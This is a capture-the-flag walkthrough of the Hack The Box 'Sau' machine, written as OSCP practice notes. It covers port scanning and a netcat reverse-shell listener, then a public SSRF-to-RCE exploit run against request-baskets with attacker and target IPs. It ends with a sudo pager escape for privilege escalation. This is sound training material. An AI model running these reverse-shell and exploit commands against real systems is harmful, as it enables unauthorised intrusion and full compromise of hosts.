---
Category: OSCP - TjNull
LAB: https://app.hackthebox.com/machines/Sau?sort_by=created_at&sort_type=desc
Difficulty: Easy
Featured:
aliases:
---

---
# Information / Description

![](../../0.%20Assets/Sau-1788988613561.webp)

---
# Walkthrough

# Foothold

We will start with the basics, let's do an `nmap` scan to see what this machine has to offer.

First let's find the ports

```
nmap -sS -p- $T --min-rate 5000 -oG openPorts
```

- `$T` is a variable i created to store the IP of the target machine

We are  storing it in a `grepable` format because i have a little functionality called `"ExtractPorts"` in my `zsh` that takes a file and with grep copies the open ports to the clipboard do we don't have to write them manually and/or scan for all ports again

Here you can find the dotfiles for the kali I created -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

Once we have the ports, we will do another `nmap` going more in detail

```
nmap -sS -p 22,55555 $T --min-rate 5000 -sVC -Pn -oN results.txt -n -vv -Pn
```


We basically find an `SSH` and an `HTTP` on a very weird port

![](../../0.%20Assets/Sau-1788988918926.webp)

I looked for `request-baskets` online and this is what i found

![](../../0.%20Assets/Sau-1788988957529.webp)

Okay cool let's see if we find an exploit before we get  creative

I found this [exploit](https://github.com/bl4ckarch/ssrf_to_rce_sau)

Basically we only need to start a listener for a reverse shell

```
rlwrap nc -lvnp 8000
```

And execute the exploit

```
python3 exploit_ssrf_to_rce_sau.py <ATTACKER_IP> <ATTACKER_PORT> <VICTIME's_BASKETS_URL>


python3 ssrf_to_rce_sau.py 10.10.15.150 8000 http://10.129.229.26:55555/
```

![](../../0.%20Assets/Sau-1788989150868.webp)

Cool, we are in.

I stabilized the shell with 

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

In in the home directory we can find the user flag

![](../../0.%20Assets/Sau-1788989287952.webp)


# Privilege Escalation

For privilege escalation I like to do some quick checks before i get to `LSE` or `Linpeas`

In this case I checked the `sudo` permissions

![](../../0.%20Assets/Sau-1788989535915.webp)

And seems like we can use `sudo` on checking the `status of the service`

![](../../0.%20Assets/Sau-1788989666773.webp)

Mm okay this is a pager

https://gtfobins.org/gtfobins/less/

![](../../0.%20Assets/Sau-1788992444768.webp)

Lets see if it works

![](../../0.%20Assets/Sau-1788992486569.webp)

Bingo